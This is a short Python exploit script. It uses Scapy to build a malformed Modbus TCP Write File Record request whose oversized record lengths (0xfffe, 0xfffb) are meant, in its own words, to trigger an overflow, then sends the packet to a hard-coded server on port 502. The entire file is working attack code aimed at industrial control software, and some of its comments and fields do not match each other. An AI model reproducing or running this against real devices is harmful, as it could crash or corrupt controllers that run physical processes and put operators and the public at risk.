import socket
from scapy.all import *
from scapy.contrib.modbus import *
import logging

logging.basicConfig(level=logging.DEBUG)

def create_exploit_packet():
    # Modbus TCP header
    transaction_id = 1
    protocol_id = 0
    length = 17  # Length for ModbusADU + ModbusPDU05WriteSingleCoilRequest
    unit_id = 1

    # Modbus function code and payload
    function_code = 0x15  # Example function code for Write File Record
    reference_type = 6  # Correct reference type for file record request
    file_number = 1
    record_number = 0
    record_length_1 = 0xfffe  # First record length to trigger overflow
    record_length_2 = 0xfffb  # Second record length to continue the loop

    # Construct the payload using Scapy
    modbus_request = ModbusADURequest(transId=transaction_id, protoId=protocol_id, len=length, unitId=unit_id) / \
                     ModbusPDU15WriteFileRecordRequest(referenceType=reference_type, fileNum=file_number, recNum=record_number, recLen1=record_length_1, data1=0xFF, recLen2=record_length_2)

    return modbus_request

def send_modbus_request():
    try:
        modbus_request = create_exploit_packet()
        
        # Convert the Scapy packet to raw bytes
        request_data = bytes(modbus_request)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.103.152.8', 502))
        logging.info("Connected to server.")
        
        s.send(request_data)
        logging.debug('Sent Modbus request: %s', repr(request_data))
        
        response = s.recv(1024)
        logging.debug('Received response: %s', repr(response))
        
        s.close()
        logging.info("Connection closed.")
    except Exception as e:
        logging.error("Error in client communication: %s", e)

if __name__ == "__main__":
    send_modbus_request()
